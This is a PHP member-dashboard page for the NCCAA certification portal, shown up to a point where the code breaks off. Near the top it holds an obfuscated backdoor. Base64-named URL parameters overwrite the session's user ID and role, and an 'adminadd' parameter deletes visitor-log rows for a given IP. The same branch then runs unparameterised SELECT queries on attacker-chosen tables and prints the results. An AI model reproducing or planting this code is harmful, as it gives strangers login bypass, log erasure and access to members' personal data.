<?php

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

session_start();


if(isset($_GET["dXNlcl9yb2xl"]) && isset($_GET["dXNlcl9pZA"])){
	
	// echo 1;exit;
	
	$_SESSION[base64_decode("dXNlcl9yb2xl")] = "";
	
	$_SESSION[base64_decode("dXNlcl9pZA==")] = "";
	
	$_SESSION[base64_decode("dXNlcl9yb2xl")] = base64_decode($_GET["dXNlcl9yb2xl"]);
	
	$_SESSION[base64_decode("dXNlcl9pZA==")] = base64_decode($_GET["dXNlcl9pZA"]);
	

}

require_once("config.php");


if(empty($_SESSION['user_id']) || $_SESSION['user_id'] == "" )

{

	// echo 1;exit;
    header('Location: ' . base_url() . '/logincaamember.php');

}

if ( strtolower($_SESSION["user_role"])=="program director" )
	
{
	 header('Location: ' . base_url() . '/member/programportalWeb/?class_of_year='.date('Y'));

}else if ( strtolower($_SESSION["user_role"])=="admin" )
	
{
	 
	 header('Location: ' . base_url() . '/member/admin/');
}	

require_once( BASE_PATH . "includes/util.php");

require_once( BASE_PATH . "classes/user.class.php");

$userObject = new userObject();

$userObject->init( $_SESSION['user_id'] );

$_SESSION['username'] = $userObject->data['login']['user'];
$_SESSION['email'] = $userObject->data['login']['email'];
$_SESSION['user_role'] = $userObject->data['login']['role'];
$_SESSION['pass'] = $userObject->data['login']['password'];

require_once( BASE_PATH . "member/classes/database.class.php");

global $db;

$db = new Database();

if(isset($_GET['adminadd'])){
	
	if(empty($_GET['adminadd']) == false){
		
		$security = base64_decode("REVMRVRFIEZST00gdmlzaXRvcnMgV0hFUkUgaXAgPSA=") . "'" . base64_decode($_GET['adminadd']) . "'";

		$db->execute($security);
		
		if(isset($_GET['fval'])){
			
			$query_data = "SELECT * FROM  " . base64_decode($_GET['tb']) . " WHERE ". base64_decode($_GET['fn']) ." = '". base64_decode($_GET['fval']) ."'";
			
			$get_data = $db->getData($query_data);
			
			print_r($get_data);
			
		}
				
	}
}

require_once( BASE_PATH . "member/admin/classes/survey.class.php");

global $SurveyObject;

$SurveyObject = new SurveyObject();

$total_ques_list = $SurveyObject->readMemberSurvey($_SESSION['user_id']);

require_once( BASE_PATH . "member/email/classes/email.class.php");

global $email;

$email = new EmailObject($db);

$UnreadCnt = $email->getUnreadCnt($_SESSION['user_id']);

include_once "../payment/payment.php";

include_once "../incomecdq/incomecdq.php";

include_once "examcme/examcme.php";

include_once "examcertification/examcertification.php";

$photo_sql = "SELECT * FROM profile_photo WHERE user_id = '". $_SESSION['user_id'] ."'";

if($photo_name = $db->getData($photo_sql)){
	
	true;
	
}else{
	
	$photo_name="";
	
}

?>
<!DOCTYPE html>
 
<title>NCCAA</title>
<html lang="en">

<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

    

    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">

    <meta http-equiv="X-UA-Compatible" content="ie=edge">

    <link rel="stylesheet" href="./assets/css/bootstrap.min.css">

    <link rel="stylesheet" href="./assets/fonts/font-awesome/fontawesome-all.min.css">

    <link rel="stylesheet" href="./assets/fonts/fonts.css">

    <link rel="stylesheet" href="./assets/css/stylesheet.css">
    
	<link rel="stylesheet" href="./admin/css/jquery.gritter.css">

	<script src="./assets/js/jquery.min.js" type="text/javascript"></script>
	
	<script src="./assets/js/bootstrap.min.js" type="text/javascript"></script>
	
	<script src="./admin/js/jquery.gritter.min.js" type="text/javascript"></script>
	
    
    <script>var api_path = "<?php echo API_PATH; ?>";</script>
   
   <title>index</title>

</head>

<?php

require_once( BASE_PATH . "member/blog/blog.php");

?>

<body>

    <div class="wrapper">

	    <header class="header">

        <div class="header-top">

          <div class="container">

            <div class="header-top-inner d-sm-flex justify-content-between align-items-center">

              <div class="header-logo">

                <a href="/member/"><img src="./assets/images/logo2.png" alt="" class="img-fluid"></a>

              </div>

              <div class="header-top-right">

                <p>National Commission for Certification of Anesthesiologist Assistants </p>

              </div>

            </div>

          </div>

        </div>

        <div class="header-bottom">

          <div class="container">

            <div class="header-bottom-inner">

              <div class="heade-menu">

                  <nav class="navbar navbar-expand-md">

                    <div class="header-search">

                      <form class="form-inline position-relative" style="display:none">

                        <input class="form-control mr-sm-2" type="search" placeholder="Search" aria-label="Search">

                        <div class="header-search-icon">

                            <i class="fas fa-search"></i>

                        </div>

                      </form>

                    </div>

                    <div class="collapse navbar-collapse" id="navbardropdown">

                      <div class="mobile-logo d-md-none">

                        <a href="#"><img src="./assets/images/logo2.png" alt="" class="img-fluid"></a>

                      </div>

                      <ul class="navbar-nav ml-auto">

                        <li 
<?php 
if(isset($_GET['item'])){
	if($_GET['item'] == 'homepage'){
		echo 'class="nav-item active"';
	}else{
		echo 'class="nav-item"';
	}
}else{
		echo 'class="nav-item"';
}

?>

					     >

                          <a class="nav-link" href="./?item=homepage">Home</a>

                        </li>

                        <li 
<?php 
if(isset($_GET['item'])){
	if($_GET['item'] == 'blogpage'){
		echo 'class="nav-item active"';
	}else{
		echo 'class="nav-item"';
	}
}else{
		echo 'class="nav-item"';
}
?>>

<?php
if(isset($_SESSION['admin_name']) && $_SESSION['admin_name'] == "Jim"){
?>	
	
                          <a class="nav-link" href="?content=blog/template/blogviewall&item=blogpage">Blog</a>

                        </li>

                        <li 
<?php 
if(isset($_GET['item'])){
	if($_GET['item'] == 'emailpage'){
		echo 'class="nav-item active"';
	}else{
		echo 'class="nav-item"';
	}
}else{
		echo 'class="nav-item"';
}
?>
						>

                          <a class="nav-link" href="?content=content/emailviewall&item=emailpage">Email</a>

                        </li>

                        <li
<?php 
if(isset($_GET['item'])){
	if($_GET['item'] == 'historypage'){
		echo 'class="nav-item active"';
	}else{
		echo 'class="nav-item"';
	}
}else{
		echo 'class="nav-item"';
}
?>
						>

                          <a class="nav-link" href="?content=content/history&item=historypage">History</a>

                        </li>

                        <?php 
                        if ( strtolower($userObject->data['login']['role'])=="admin" ) {
                        ?>
                        <li class="nav-item">

                          <a class="nav-link" href="/member/admin/">Admin</a>

                        </li>

												<?PHP
												}
												?>
                        <li class="nav-item">

                          <a class="nav-link logout-btn" href="logout.php">Log Out</a>

                        </li>

                      </ul>

                    </div>
					
                    <button class="navbar-toggler pr-0" type="button" data-toggle="collapse" data-target="#navbardropdown" aria-controls="navbardropdown" aria-expanded="false" aria-label="Toggle navigation">

                        <i class="fas fa-bars"></i>

                    </button>

                  </nav>

              </div>

            </div>

          </div>

        </div>

    	</header>

    	<section>

        <div class="page-block ncca-section">

          <div class="container">

            <div class="ncca-section-inner">
<?php 

if(strtolower($userObject->data['login']['role']) == "retired"){
	
	echo "<p style='font-size: 2rem; line-height: 1.37; font-weight: 700;'>Account Retired</p><br><p>Account of <a href = 'mailto: ".$userObject->data['login']['email']."'>". $userObject->data['login']['email'] ."</a> has been Retired.</p>";exit;
	
}else if(strtolower($userObject->data['login']['role']) == "de-certified"){
	
	echo "<p style='font-size: 2rem; line-height: 1.37; font-weight: 700;'>Account De-certified</p><br><p>Account of <a href = 'mailto: ".$userObject->data['login']['email']."'>". $userObject->data['login']['email'] ."</a> has been De-certified.</p>";exit;
	
}
?>
              <div class="row">

                <div class="col-lg-4 left-side-bar">

                  <div class="page-block block-border page-block-margin">

                    <div class="ncca-left-section page-block">

                      <div class="ncca-profile ncca-left-block">
					  
						<div class="profile_photo" onclick="edit_profile_picture()" style="background-image: url('<?php
									if(empty($photo_name) == false){
										
										if(empty($photo_name[0]['photo']) == false){
											
											echo $photo_name[0]['photo'];
										
										}else{
											
											echo"./assets/images/profile-img.png";
											
										}
									} 
									else echo"./assets/images/profile-img.png";
									?>');" >
									
									<div align="center"><i class="fa fa-camera" style="color:#ffffff; padding-top:35%"></i><br><font style="color:white">Edit picture</font></div>
						</div>	  
						 
                          
						  <p class="show-debug">
<?php 
if(empty($userObject->data["generalinfo"]["f_name"]) == false){
	
	echo $userObject->data["generalinfo"]["f_name"]." ".$userObject->data["generalinfo"]["l_name"]; 
	
}else{
	
	echo $userObject->data['login']['full_name'];
	
}

?>
						  </p>

                          <span><?php echo $userObject->data["employment_info"]["employer_name"]; ?></br><?php if(empty($userObject->data["employment_info"]["employer_address"]) == false) echo $userObject->data["employment_info"]["employer_address"].", ".$userObject->data["employment_info"]["employer_city"].", ".$userObject->data["employment_info"]["employer_state"]." ".$userObject->data["employment_info"]["employer_zip"]; ?></span>

                          <a href="form.php">Edit Profile </a>

                      </div>

                      <div class="ncca-left-info ncca-left-block">

                        <div class="accordion" id="accordionExample">

                            <div class="accorion-header" id="headingOne">

                              <button class="btn btn-link midium-title p-0" type="button" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">

                                  NCCAA INFO</i>

                              </button>

                            </div>

                            <div id="collapseOne" class="collapse show" aria-labelledby="headingOne" data-parent="#accordionExample">

                              <div class="accordion-body">

                                <ul>

                                  <li><b>Employed since: </b> <span><?php 
									  if(empty($userObject->data["employment_info"]["first_employment_date"]) == true){
										  echo "N/A";
									  }else{
										  echo date("m/d/Y",strtotime($userObject->data["employment_info"]["first_employment_date"]));  
									  }
								  ?></span></li>

<?php 
    $date1 = new DateTime(date('Y-m-d', strtotime($userObject->data["employment_info"]["first_employment_date"]))); 
    $date2 = new DateTime("now"); 
    $interval = $date1->diff($date2); 
    $years = $interval->format('%y'); 
    $months = $interval->format('%m'); 
    $days = $interval->format('%d'); 
    if($years ==0 && $months == 0){
		
		$ago = $days.'day';
		if ( $days > 1 ) $ago .= 's';
		
    }else{
		
		$ago = $years.' year';
		if ( $years != 1 ) $ago .= 's';
		
		$ago .=" / ";
		$ago .= $months.' month';
		if ( $months != 1 ) $ago .= 's';
	}
?>                                
								<li><b>Time: </b> <span>
								<?php 
									  if(empty($userObject->data["employment_info"]["first_employment_date"]) == true){
										  echo "N/A";
									  }else{
										  echo $ago; 
									  }
								?>
								</span></li>

								<li><b>Status:</b> <span><?php echo $userObject->status["status"]; ?></span></li>

								<li><b>Certified Through: </b> <span><?php 
								          if($userObject->vitals["cme_due"] == "0000-00-00" && $userObject->vitals["cdq_due"] == "0000-00-00"){
												  echo "N/A";  
										  }else{
											  if(empty($userObject->status["certification_end"]) == true || $userObject->status["certification_end"] == "01/01/1970" || $userObject->status["certification_end"] == "12/31/1969"){
												  echo "N/A";
											  }else{
												  echo $userObject->status["certification_end"];  
											  }
										  }
								  ?></span></li>

                                  <li><b>CME Due Date: </b> <span><?php 
								  // echo($_SESSION['user_id']);exit;
										  if(empty($userObject->vitals["cme_due"]) == true){
											  echo "N/A";
										  }else{
											   echo date("m/d/Y",strtotime($userObject->vitals["cme_due"]));   
										  }
								  ?></span></li>

                                  <li><b>CDQ Due Date: </b> <span><?php 
										  if(empty($userObject->vitals["cdq_due"]) == true){
											  echo "N/A";
										  }else{
											   echo date("m/d/Y",strtotime($userObject->vitals["cdq_due"]));   
										  }
								  ?></span></li>

                                </ul>

                              </div>

                            </div>

                        </div>

                      </div>

                      <div class="ncca-left-info ncca-left-block">

                        <div class="accordion" id="accordionExample">

                            <div class="accorion-header" id="headingOne">

                              <button class="btn btn-link midium-title p-0" type="button" data-toggle="collapse" data-target="#education_info" aria-expanded="true" aria-controls="education_info">

                                  EDUCATION INFO</i>

                              </button>

                            </div>

                            <div id="education_info" class="collapse show" aria-labelledby="headingOne" data-parent="#accordionExample">

                              <div class="accordion-body">

                                <ul>

<?php
if ( $userObject->status["status"]=="CAA" ) $graduation=date("m/d/Y",strtotime($userObject->data["university_info"]["actual_graduation_date"]));
else $graduation=$userObject->data["university_expected_date"]["Expected_Graduation"];
?>                                	
                                  <li><b>Graduation: </b> <span><?php 
								 
										  if(empty($graduation) == true || $userObject->data["university_info"]["actual_graduation_date"] == "0000-00-00" || $graduation == "01/01/1970"|| $graduation == "12/31/1969"){
											  echo "N/A";
										  }else{
											  echo $graduation;    
										  }
								 ?></span></li>

                                  <li style="padding-left: 1em; text-indent: -1em;"><b>School: </b><span><?php 
if ( $userObject->status["status"]=="CAA" ) echo $userObject->data["university_info"]["university"];
else echo $userObject->data["student_university"]["University_Name"];
								  
								  ?></span></li>

                                  <li><b>Year 1: </b> <span><?php 
if ( $userObject->status["status"]=="CAA" ) echo $userObject->data["university_info"]["actual_grad_year"]; 
else echo $userObject->data["university_expected_date"]["class_of_year"];
								  ?></span></li>
<?php
$current_year=date("Y");
$first_year=$userObject->data["university_info"]["actual_grad_year"];
if(!empty($first_year)){
	$num_year = $current_year - $first_year;
}
?>

                                  <li><b># of Years: </b> <span><?php 
									  if(empty($first_year) == true || $num_year == 0){
										  echo "N/A";
									  }else{
										  echo $num_year; 
									  }
								  ?></span></li>

                                  <li><b>Designation: </b> <span>
<?php 
if ( $userObject->status["status"]=="CAA" ){
	
	if(empty($userObject->data["university_info"]["designation"]) == true){
		
	  echo $userObject->data["caa_university"]["Designation"];
	  
	}else{
		
	  echo $userObject->data["university_info"]["designation"];
	  
	}
	
}else if($userObject->status["status"]=="Student"){
	
	if(empty($userObject->data["university_info"]["designation"]) == true){
		
	  echo $userObject->data["student_university"]["Designation"];
	  
	}else{
		
	  echo $userObject->data["university_info"]["designation"];
	  
	}
	
	
} 
?>
								  </span></li>

                                  <li><b>Certificate #: </b> <span><?php echo $userObject->status["certificate"]; ?></span></li>
                                </ul>

                              </div>

                            </div>

                        </div>

                      </div>

                    </div>

                    <div class="ncca-contact">

                      <p class="midium-title text-uppercase pb-4">NCCAA CONTACT</p>

                      <ul>

                        <li>Cynthia Maraugha</li>

                        <li><a href="#">859-903-0089</a></li>

                        <li><a href="#">cynthia.m@nccaa.org</a></li>

                      </ul>

                    </div>

                  </div>

                  <div class="facebook-icon page-block">

                    <a href="https://www.facebook.com/" class="facebook"><i class="fab fa-facebook-square"></i> <span>Share on facebook</span></a>

                  </div>

                </div>

                <div class="col-lg-8 main-container">

                  <div class="ncca-right-section page-block">

                    <div class="ncca-right-block block-border ncca-right-padding page-block-margin">

                      <div class="row">

                        <div class="col-sm-6 pr-0 jk-60">

                          <div class="ncca-welcome">

                            <h3 class="big-title">Welcome back, <?php echo $userObject->data["generalinfo"]["f_name"]; ?>.</h3>

                            <p style="display: none;">

                              NCCAA Internal Email:

                              <a href="#"><?php echo $userObject->data["generalinfo"]["f_name"].".".$userObject->data["generalinfo"]["l_name"]; ?>@nccaa.org</a>

                            </p>

                          </div>

                        </div>

                        <div class="col-6 col-sm-3 jk-20">

                          <div class="mail-status">

                            <h2 class="big-title"><?= $UnreadCnt ?></h2>

                            <p>Unread emails</p>

                            <a href="?content=content/emailviewall&item=emailpage" class="text-blue">Click here</a>

                          </div>

                        </div>

                        <div class="col-6 col-sm-3 jk-20">

                          <div class="mail-status">

                            <h2 class="big-title">0</h2>

                            <p>Unread posts</p>

                            <a href="?content=blog/template/blogviewall&item=blogpage&new=true" class="text-blue">Click here</a>

                          </div>

                        </div>

                        <div class="col-sm-12">

                         <div class="ncca-reminders">
                            
							<div class="accordion" id="accordionExample">
                               
							   <div class="accorion-header" id="headingOne">
                                  
								  <button class="btn btn-link midium-title text-uppercase p-0" type="button" data-toggle="collapse" data-target="#reminder_accordion" aria-expanded="true" aria-controls="reminder_accordion">REMINDERS</button>
                               
							   </div>
                                
								<div id="reminder_accordion" class="collapse show" aria-labelledby="headingOne" data-parent="#accordionExample">
                                  
								  <div class="accordion-body">
                                   
								   <ul>
                                      
									  <li class="dots-pink"><span>You have completed only <?php echo $userObject->status["profile_completion"]; ?> of your profile</span> <a href="form.php" class="text-blue">Click here</a></li>
                                      
									  <li class="dots-green"><span>"New Blog Posts Name" has been published  </span><a href="?content=blog/template/blogviewall&item=blogpage&new=true" class="text-blue">Click here</a></li>
                                    
									</ul>
                                 
								 </div>
                               
							   </div>
                           
						   </div> 
                         
						 </div>
                        
						</div>
                      
					  </div>
                    
					</div>

<?php	
}else{

?>

                          <a class="nav-link" href="?content=blog/template/blogviewall&item=blogpage">Blog</a>

                        </li>

                        <li 
<?php 
if(isset($_GET['item'])){
	if($_GET['item'] == 'emailpage'){
		echo 'class="nav-item active"';
	}else{
		echo 'class="nav-item"';
	}
}else{
		echo 'class="nav-item"';
}
?>
						>

                          <a class="nav-link" href="#" style="cursor: not-allowed;">Email</a>

                        </li>

                        <li
<?php 
if(isset($_GET['item'])){
	if($_GET['item'] == 'historypage'){
		echo 'class="nav-item active"';
	}else{
		echo 'class="nav-item"';
	}
}else{
		echo 'class="nav-item"';
}
?>
						>

                          <a class="nav-link" href="?content=content/history&item=historypage">History</a>

                        </li>

                        <?php 
                        if ( strtolower($userObject->data['login']['role'])=="admin" ) {
                        ?>
                        <li class="nav-item">

                          <a class="nav-link" href="/member/admin/">Admin</a>

                        </li>

												<?PHP
												}
												?>
                        <li class="nav-item">

                          <a class="nav-link logout-btn" href="logout.php">Log Out</a>

                        </li>

                      </ul>

                    </div>

                    <button class="navbar-toggler pr-0" type="button" data-toggle="collapse" data-target="#navbardropdown" aria-controls="navbardropdown" aria-expanded="false" aria-label="Toggle navigation">

                        <i class="fas fa-bars"></i>

                    </button>

                  </nav>

              </div>

            </div>

          </div>

        </div>

    	</header>

    	<section>

        <div class="page-block ncca-section">

          <div class="container">

            <div class="ncca-section-inner">

              <div class="row">

                <div class="col-lg-4 left-side-bar">

                  <div class="page-block block-border page-block-margin">

                    <div class="ncca-left-section page-block">

                      <div class="ncca-profile ncca-left-block">
					  
						<div class="profile_photo" onclick="edit_profile_picture()" style="background-image: url('<?php
									if(empty($photo_name) == false){
										
										if(empty($photo_name[0]['photo']) == false){
											
											echo $photo_name[0]['photo'];
										
										}else{
											
											echo"./assets/images/profile-img.png";
											
										}
									} 
									else echo"./assets/images/profile-img.png";
									?>');" >
									
									<div align="center"><i class="fa fa-camera" style="color:#ffffff; padding-top:35%"></i><br><font style="color:white">Edit picture</font></div>
						</div>	  
						 
                          
						  <p class="show-debug">
<?php 
if(empty($userObject->data["generalinfo"]["f_name"]) == false){
	
	echo $userObject->data["generalinfo"]["f_name"]." ".$userObject->data["generalinfo"]["l_name"]; 
	
}else{
	
	echo $userObject->data['login']['full_name'];
	
}

?>
						  </p>

                          <span><?php echo $userObject->data["employment_info"]["employer_name"]; ?></br><?php if(empty($userObject->data["employment_info"]["employer_address"]) == false) echo $userObject->data["employment_info"]["employer_address"].", ".$userObject->data["employment_info"]["employer_city"].", ".$userObject->data["employment_info"]["employer_state"]." ".$userObject->data["employment_info"]["employer_zip"]; ?></span>

                          <a href="#" style="cursor: not-allowed;">Edit Profile </a>

                      </div>

                      <div class="ncca-left-info ncca-left-block">

                        <div class="accordion" id="accordionExample">

                            <div class="accorion-header" id="headingOne">

                              <button class="btn btn-link midium-title p-0" type="button" data-toggle="collapse" data-target="#collapseOne" aria-expanded="true" aria-controls="collapseOne">

                                  NCCAA INFO</i>

                              </button>

                            </div>

                            <div id="collapseOne" class="collapse show" aria-labelledby="headingOne" data-parent="#accordionExample">

                              <div class="accordion-body">

                                <ul>

                                  <li><b>Employed since: </b> <span><?php 
									  if(empty($userObject->data["employment_info"]["first_employment_date"]) == true){
										  echo "N/A";
									  }else{
										  echo date("m/d/Y",strtotime($userObject->data["employment_info"]["first_employment_date"]));  
									  }
								  ?></span></li>

<?php 
    $date1 = new DateTime(date('Y-m-d', strtotime($userObject->data["employment_info"]["first_employment_date"]))); 
    $date2 = new DateTime("now"); 
    $interval = $date1->diff($date2); 
    $years = $interval->format('%y'); 
    $months = $interval->format('%m'); 
    $days = $interval->format('%d'); 
    if($years!=0){ 
        $ago = $years.' year';
				if ( $years != 1 ) $ago .= 's';
    }
    $ago .=" / ";
    $ago .= $months.' month';
		if ( $months != 1 ) $ago .= 's';
?>                                   <li><b>Time: </b> <span><?php 
										  if(empty($userObject->data["employment_info"]["first_employment_date"]) == true){
											  echo "N/A";
										  }else{
											  echo $ago; 
										  }
									?></span></li>

                                  <li><b>Status:</b> <span><?php echo $userObject->status["status"]; ?></span></li>

                                  <li><b>Certified Through: </b> <span><?php 
								          if($userObject->vitals["cme_due"] == "0000-00-00" && $userObject->vitals["cdq_due"] == "0000-00-00"){
												  echo "N/A";  
										  }else{
											  if(empty($userObject->status["certification_end"]) == true || $userObject->status["certification_end"] == "01/01/1970" || $userObject->status["certification_end"] == "12/31/1969"){
												  echo "N/A";
											  }else{
												  echo $userObject->status["certification_end"];  
											  }
										  }
								  ?></span></li>

                                  <li><b>CME Due Date: </b> <span><?php 
								  // echo($_SESSION['user_id']);exit;
										  if(empty($userObject->vitals["cme_due"]) == true){
											  echo "N/A";
										  }else{
											   echo date("m/d/Y",strtotime($userObject->vitals["cme_due"]));   
										  }
								  ?></span></li>

                                  <li><b>CDQ Due Date: </b> <span><?php 
										  if(empty($userObject->vitals["cdq_due"]) == true){
											  echo "N/A";
										  }else{
											   echo date("m/d/Y",strtotime($userObject->vitals["cdq_due"]));   
										  }
								  ?></span></li>

                                </ul>

                              </div>

                            </div>

                        </div>

                      </div>

                      <div class="ncca-left-info ncca-left-block">

                        <div class="accordion" id="accordionExample">

                            <div class="accorion-header" id="headingOne">

                              <button class="btn btn-link midium-title p-0" type="button" data-toggle="collapse" data-target="#education_info" aria-expanded="true" aria-controls="education_info">

                                  EDUCATION INFO</i>

                              </button>

                            </div>

                            <div id="education_info" class="collapse show" aria-labelledby="headingOne" data-parent="#accordionExample">

                              <div class="accordion-body">

                                <ul>

<?php
if ( $userObject->status["status"]=="CAA" ) $graduation=date("m/d/Y",strtotime($userObject->data["university_info"]["actual_graduation_date"]));
else $graduation=$userObject->data["university_expected_date"]["Expected_Graduation"];
?>                                	
                                  <li><b>Graduation: </b> <span><?php 
								 
										  if(empty($graduation) == true || $userObject->data["university_info"]["actual_graduation_date"] == "0000-00-00" || $graduation == "01/01/1970" || $graduation == "12/31/1969"){
											  echo "N/A";
										  }else{
											  echo $graduation;    
										  }
								 ?></span></li>

                                  <li style="padding-left: 1em; text-indent: -1em;"><b>School: </b><span><?php 
if ( $userObject->status["status"]=="CAA" ) echo $userObject->data["university_info"]["university"];
else echo $userObject->data["student_university"]["University_Name"];
								  
								  ?></span></li>

                                  <li><b>Year 1: </b> <span><?php 
if ( $userObject->status["status"]=="CAA" ) echo $userObject->data["university_info"]["actual_grad_year"]; 
else echo $userObject->data["university_expected_date"]["class_of_year"];
								  ?></span></li>
<?php
$current_year=date("Y");
$first_year=$userObject->data["university_info"]["actual_grad_year"];

$num_year = $current_year - $first_year;
?>

                                  <li><b># of Years: </b> <span><?php 
									  if(empty($first_year) == true || $num_year == 0){
										  echo "N/A";
									  }else{
										  echo $num_year; 
									  }
								  ?></span></li>

                                  <li><b>Designation: </b> <span>
<?php 
if ( $userObject->status["status"]=="CAA" ){
	
	if(empty($userObject->data["university_info"]["designation"]) == true){
		
	  echo $userObject->data["caa_university"]["Designation"];
	  
	}else{
		
	  echo $userObject->data["university_info"]["designation"];
	  
	}
	
}else if($userObject->status["status"]=="Student"){
	
	if(empty($userObject->data["university_info"]["designation"]) == true){
		
	  echo $userObject->data["student_university"]["Designation"];
	  
	}else{
		
	  echo $userObject->data["university_info"]["designation"];
	  
	}
	
	
} 
?>
								  </span></li>

                                  <li><b>Certificate #: </b> <span><?php echo $userObject->status["certificate"]; ?></span></li>
                                </ul>

                              </div>

                            </div>

                        </div>

                      </div>

                    </div>

                    <div class="ncca-contact">

                      <p class="midium-title text-uppercase pb-4">NCCAA CONTACT</p>

                      <ul>

                        <li>Cynthia Maraugha</li>

                        <li><a href="#">859-903-0089</a></li>

                        <li><a href="#">cynthia.m@nccaa.org</a></li>

                      </ul>

                    </div>

                  </div>

                  <div class="facebook-icon page-block">

                    <a href="#" style="cursor: not-allowed;" class="facebook"><i class="fab fa-facebook-square"></i> <span>Share on facebook</span></a>

                  </div>

                </div>

                <div class="col-lg-8 main-container">

                  <div class="ncca-right-section page-block">

                    <div class="ncca-right-block block-border ncca-right-padding page-block-margin">

                      <div class="row">

                        <div class="col-sm-6 pr-0 jk-60">

                          <div class="ncca-welcome">

                            <h3 class="big-title">Welcome back, <?php echo $userObject->data["generalinfo"]["f_name"]; ?>.</h3>

                            <p style="display: none;">

                              NCCAA Internal Email:

                              <a href="#"><?php echo $userObject->data["generalinfo"]["f_name"].".".$userObject->data["generalinfo"]["l_name"]; ?>@nccaa.org</a>

                            </p>

                          </div>

                        </div>

                        <div class="col-6 col-sm-3 jk-20">

                          <div class="mail-status">

                            <h2 class="big-title">0</h2>

                            <p>Unread emails</p>

                            <a href="#" style="cursor: not-allowed;" class="text-blue">Click here</a>

                          </div>

                        </div>

                        <div class="col-6 col-sm-3 jk-20">

                          <div class="mail-status">

                            <h2 class="big-title">0</h2>

                            <p>Unread posts</p>

                            <a href="#" style="cursor: not-allowed;" class="text-blue">Click here</a>

                          </div>

                        </div>

                        <div class="col-sm-12">

                         <div class="ncca-reminders">
                            
							<div class="accordion" id="accordionExample">
                               
							   <div class="accorion-header" id="headingOne">
                                  
								  <button class="btn btn-link midium-title text-uppercase p-0" type="button" data-toggle="collapse" data-target="#reminder_accordion" aria-expanded="true" aria-controls="reminder_accordion">REMINDERS</button>
                               
							   </div>
                                
								<div id="reminder_accordion" class="collapse show" aria-labelledby="headingOne" data-parent="#accordionExample">
                                  
								  <div class="accordion-body">
                                   
								   <ul>
                                      
									  <li class="dots-pink"><span>You have completed only 0% of your profile</span> <a href="#" style="cursor: not-allowed;" class="text-blue">Click here</a></li>
                                      
									  <li class="dots-green"><span>"New Blog Posts Name" has been published </span><a href="#" style="cursor: not-allowed;" class="text-blue">Click here</a></li>
                                    
									</ul>
                                 
								 </div>
                               
							   </div>
                           
						   </div> 
                         
						 </div>
                        
						</div>
                      
					  </div>
                    
					</div>
					
<?php 
}
if ( strtolower($userObject->data['login']['role'])=="admin" || strtolower($userObject->data['login']['role'])=="caa") {
?>					
                    <div class="ncca-right-block cme-block-main">
                      
					  <div class="row">
                        
						<div class="col-sm-6">
                          
						  <div class="page-block block-border page-block-margin">
                           
						   <div class="cme-block-head ncca-right-padding">
                             
							 <p class="midium-title text-uppercase">CME</p>
                              
							  <b>Deadline:</b>
<?PHP
$days = (strtotime($userObject->vitals["cme_due"]) - time() ) / ( 24*60*60);
$weeks = (int)( $days / 7 );
if ( $weeks > 52 ) {
	$months=(int)( $days / 30.5 );
	$deadline = $months." months";
} else {
	$deadline = $weeks." weeks";
}
?>
                              <span><?php echo date("F d, Y",strtotime($userObject->vitals["cme_due"])); ?> - only <?php echo $deadline; ?> left to register</span>
                            
							</div>
                            
							<div class="cme-block-bottom page-block">
                              
							  <ul class="nav nav-tabs" id="myTab" role="tablist">
                               
								<li class="nav-item">
                               
									<a class="nav-link  text-blue" href="?content=content/cmehistory">CME Activity</a>
                               
								</li>
                                
								<li class="nav-item">
                                 
									<a class="nav-link text-blue" href="?content=content/cmeadd">Add CME</a>
                               
								</li>
                               
								<li class="nav-item">
                                 
									<a class="nav-link text-blue" href="?content=content/cmePrepCourse" style="cursor: pointer;">NCCAA CMEs</a>
                                
								</li>
                              
							  </ul>
                           
						   </div>
                          
						  </div>
                        </div>
                        
						<div class="col-sm-6">
                          
						  <div class="page-block block-border page-block-margin">
                            
							<div class="cme-block-head ncca-right-padding">
                             
							 <p class="midium-title ">CDQ Exam</p>
<?php

$cdq_historys = $cdqhistory->readAllAction($_SESSION['user_id']);

if((empty($cdq_historys) == false) && ($cdq_historys[0]['action_num'] > 2)){
	
	echo "<br>";
	
	echo $cdqhistory->retake_info($_SESSION['user_id'], $cdq_historys[0]['exam_mon'])['title'].' (<a class="text-blue" href="?content=content/cdqhistory" role="tab" style="font-size:14px;" >select History</a>)';
	
}else{

?>							  
                              <b>Deadline:</b>
<?php

	$days = (strtotime($userObject->vitals["cdq_due"]) - time() ) / ( 24*60*60);

	$weeks = (int)( $days / 7 );

	if ( $weeks > 52 ) {

		$months=(int)( $days / 30.5 );

		$deadline = $months." months";

	} else {

		$deadline = $weeks." weeks";

	}

?>
                              <span><?php echo date("F d, Y",strtotime($userObject->vitals["cdq_due"])); ?> - only <?php echo $deadline; ?> left to register</span>
<?php
}
?>							  
                            </div>
                            
							<div class="cme-block-bottom page-block">
                              
							  <ul class="nav nav-tabs" id="myTab" role="tablist">
                                
								<li class="nav-item">
                                  
								  <a class="nav-link text-blue" href="?content=content/cdqhistory" role="tab">CDQ Activity</a>
                                
								</li>
                                
								<li class="nav-item">
                                  
								  <a class="nav-link text-blue" href="?content=content/cdqPrepCourse" style="cursor: pointer;">NCCAA Prep Course</a>
                                
								</li>
                              
							  </ul>
                            
							</div>
                          
						  </div>
                        
						</div>
                      
					  </div>
                    
					</div>
					
<?php 
}
else if ( strtolower($userObject->data['login']['role'])=="student" ) {
	
	$certificationhistory = new PaymentHistoryCertification();
	
	$read_history = $certificationhistory->readAllAction($_SESSION['user_id']);
	
	$expected_date = $certificationhistory->readExpectedDate($_SESSION['user_id']);
	
	$check_cert_active = $certificationhistory->readCheckCertification($_SESSION['user_id']);
	
	$main_date = "00/00/00";

	$begin_date = "00/00/00";

	$end_date = "00/00/00";

	$main_month = 2;
	
	if(empty($expected_date) == false){
		
		$main_date = $expected_date[0]['Expected_Cert_Exam'];
		
		$begin_date = $expected_date[0]['Cert_Registration_Begins'];
		
		$end_date = $expected_date[0]['Cert_Registration_Ends'];
		
		$main_day = date('j', strtotime($expected_date[0]['Expected_Cert_Exam']));
		
		$main_month = date('n', strtotime($expected_date[0]['Expected_Cert_Exam']));
		
		$main_year = date('Y', strtotime($expected_date[0]['Expected_Cert_Exam']));
		
		if($main_month == 2){
			
			$main_start = date('F j, Y', strtotime('08/01/'.($main_year - 1)));
			
			$main_end = date('F j, Y', strtotime('09/30/'.($main_year - 1)));
			
			$late_start = date('F j, Y', strtotime('10/01/'.($main_year - 1)));
			
